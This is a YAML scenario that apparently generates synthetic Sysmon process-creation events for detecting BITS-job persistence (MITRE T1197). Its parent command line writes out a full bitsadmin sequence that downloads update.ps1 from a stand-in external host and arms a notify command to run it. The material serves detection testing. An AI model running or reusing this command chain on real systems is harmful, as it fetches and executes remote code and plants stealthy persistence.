type: scenario
description: |
  Persistence via the Background Intelligent Transfer Service (BITS). The
  native bitsadmin.exe utility is run from a command prompt to arm a BITS
  job with a notify command (/setnotifycmdline), so an attacker-chosen
  program runs whenever the transfer job changes state -- a stealthy way
  to survive reboots without a scheduled task or run key (MITRE ATT&CK
  T1197). Sysmon EID 1 records the process image path, command line, and
  PE metadata including OriginalFileName; the parent command line preserves
  the surrounding create/addfile/resume sequence. Binary-specific fields
  (image, command_line, original_file_name, file_version, description,
  hashes) are state parameters.
  Reference: https://attack.mitre.org/techniques/T1197/
tags: [eid1]
mitre:
  tactics: [persistence, defense-evasion]
  techniques: [T1197]

state:
  domain_short:        CORP
  domain_tld:          local
  domain_short_lower:  fn.lower(ref.domain_short)
  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
  sysmon_pid:          gen.int(min=1000, max=4000)
  sysmon_tid:          gen.int(min=1000, max=9999)
  process_guid_raw:    gen.uuid()
  process_guid:        "{${ref.process_guid_raw}}"
  process_id:          gen.int(min=1000, max=9999)
  parent_guid_raw:     gen.uuid()
  parent_process_guid: "{${ref.parent_guid_raw}}"
  parent_process_id:   gen.int(min=1000, max=9999)
  logon_guid_raw:      gen.uuid()
  logon_guid:          "{${ref.logon_guid_raw}}"
  logon_id_hex:        gen.hex(len=6)
  logon_id:            "0x${ref.logon_id_hex}"
  event_record_id:     gen.int(min=5000, max=99999)
  username:            gen.username()
  user:                "${ref.domain_short}\\${ref.username}"
  bits_job:            WinUpdate
  image:               "C:\\Windows\\System32\\bitsadmin.exe"
  file_version:        "7.8.14393.0 (rs1_release.160715-1616)"
  description:         "BITS administration utility"
  original_file_name:  bitsadmin.exe
  hashes:              "MD5=F548717B821860C2B2242367732FE105,SHA256=E1057A20945BCE8F00C0BE5E3DB40C4A98AB33F42F4D2DF919AEDB0EF6651D6E,IMPHASH=CE0EB5030AA7D3C8606F11BBCA0BC912"
  command_line:        "bitsadmin.exe  /setnotifycmdline ${ref.bits_job} C:\\Windows\\System32\\cmd.exe \"/c C:\\Users\\${ref.username}\\AppData\\Local\\Temp\\update.ps1\""
  current_directory:   "C:\\Users\\${ref.username}\\AppData\\Local\\Temp\\"
  parent_image:        "C:\\Windows\\System32\\cmd.exe"
  parent_command_line: '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /create WinUpdate & bitsadmin.exe /addfile WinUpdate https://updates.example.net/pkg/update.ps1 %temp%\update.ps1 & bitsadmin.exe /setnotifycmdline WinUpdate C:\Windows\system32\cmd.exe /c %temp%\update.ps1 & bitsadmin.exe /resume WinUpdate & timeout 5 & bitsadmin.exe /complete WinUpdate"'

steps:
  - emit:
      event_type: windows.wineventlog@v1
      fields:
        System:
          Provider:
            "@Name": Microsoft-Windows-Sysmon
            "@Guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
          EventID: 1
          Version: 5
          Level: 4
          Task: 1
          Opcode: 0
          Keywords: "0x8000000000000000"
          TimeCreated:
            "@SystemTime": gen.timestamp(format=wineventlog)
          EventRecordID: ref.event_record_id
          Correlation: {}
          Execution:
            "@ProcessID": ref.sysmon_pid
            "@ThreadID": ref.sysmon_tid
          Channel: Microsoft-Windows-Sysmon/Operational
          Computer: ref.computer
          Security:
            "@UserID": S-1-5-18
        EventData:
          Data:
            - "@Name": RuleName
              "#text": "-"
            - "@Name": UtcTime
              "#text": gen.timestamp(format=sysmon)
            - "@Name": ProcessGuid
              "#text": ref.process_guid
            - "@Name": ProcessId
              "#text": ref.process_id
            - "@Name": Image
              "#text": ref.image
            - "@Name": FileVersion
              "#text": ref.file_version
            - "@Name": Description
              "#text": ref.description
            - "@Name": Product
              "#text": "Microsoft® Windows® Operating System"
            - "@Name": Company
              "#text": Microsoft Corporation
            - "@Name": OriginalFileName
              "#text": ref.original_file_name
            - "@Name": CommandLine
              "#text": ref.command_line
            - "@Name": CurrentDirectory
              "#text": ref.current_directory
            - "@Name": User
              "#text": ref.user
            - "@Name": LogonGuid
              "#text": ref.logon_guid
            - "@Name": LogonId
              "#text": ref.logon_id
            - "@Name": TerminalSessionId
              "#text": 2
            - "@Name": IntegrityLevel
              "#text": High
            - "@Name": Hashes
              "#text": ref.hashes
            - "@Name": ParentProcessGuid
              "#text": ref.parent_process_guid
            - "@Name": ParentProcessId
              "#text": ref.parent_process_id
            - "@Name": ParentImage
              "#text": ref.parent_image
            - "@Name": ParentCommandLine
              "#text": ref.parent_command_line
